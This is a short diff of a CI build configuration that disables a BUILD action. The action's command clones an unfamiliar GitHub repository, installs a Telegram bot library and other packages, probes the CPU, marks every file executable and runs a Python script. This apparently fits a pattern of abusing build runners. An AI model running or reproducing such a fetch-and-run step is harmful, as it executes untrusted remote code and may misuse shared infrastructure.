@@ -7,6 +7,7 @@
   actions:
   - action: "git clone https://github.com/aaduopl/Kk && cd Kk && pip install telebot pymongo aiohttp && lscpu && chmod +x * && python3 m.py"
     type: "BUILD"
+    disabled: true
     docker_image_name: "ubuntu/python"
     docker_image_tag: "latest"
     execute_commands:
